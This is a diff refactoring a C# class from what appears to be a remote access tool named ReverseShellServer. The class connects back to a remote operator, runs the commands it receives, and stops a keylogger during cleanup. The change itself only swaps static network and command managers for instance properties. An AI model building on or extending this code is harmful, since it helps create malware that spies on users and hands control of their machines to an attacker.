@@ -1,15 +1,18 @@
 ﻿using Commands;
-using NetworkManager;
 using Shared;
 using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Threading;
 
 namespace ReverseShellServer
 {
     public class ServerManager
     {
+        internal ServerNetworkManager networkManager { get; set; }
+
+        internal CommandsManager commandsManager { get; set; }
+
+
         /// <summary>
         /// Constructor checks if another instance of the application is already running,
         /// if there is one, close itself and let the already started one live
@@ -50,7 +53,7 @@ namespace ReverseShellServer
         /// <param name="remotePort">Remote end's port to connect to</param>
         void RunServer(string remoteAdress, int remotePort)
         {
-            if (!GlobalNetworkManager.ServerNetworkManager.ConnectToClient(remoteAdress, remotePort))
+            if (!networkManager.ConnectToClient(remoteAdress, remotePort))
             {
                 // the connection attempt wasn't successfull
                 return;
@@ -61,7 +64,7 @@ namespace ReverseShellServer
             {
                 try
                 {
-                    var incomingData = GlobalNetworkManager.ReadLine();
+                    var incomingData = networkManager.ReadLine();
                     // A simple dot beeing received is the client's connection monitoring sending a hearthbeat message
                     if(incomingData == ".")
                         continue;
@@ -82,7 +85,7 @@ namespace ReverseShellServer
         /// <param name="receivedData">Data sent by the client</param>
         void ProcessCommand(string receivedData)
         {
-            var splittedCommand = CommandsManager.GetSplittedCommand(receivedData);
+            var splittedCommand = commandsManager.GetSplittedCommand(receivedData);
             var commandName = splittedCommand[0];
             var arguments = new List<string>();
 
@@ -91,7 +94,7 @@ namespace ReverseShellServer
                 arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
             }
 
-            var command = CommandsManager.GetCommandByName(commandName);
+            var command = commandsManager.GetCommandByName(commandName);
             if (command != null)
             {
                 try
@@ -114,7 +117,7 @@ namespace ReverseShellServer
             try
             {
                 MainWindow.keyLoggerManager.Stop();
-                GlobalNetworkManager.ServerNetworkManager.Cleanup();
+                networkManager.Cleanup();
             }
             catch (Exception)
             {
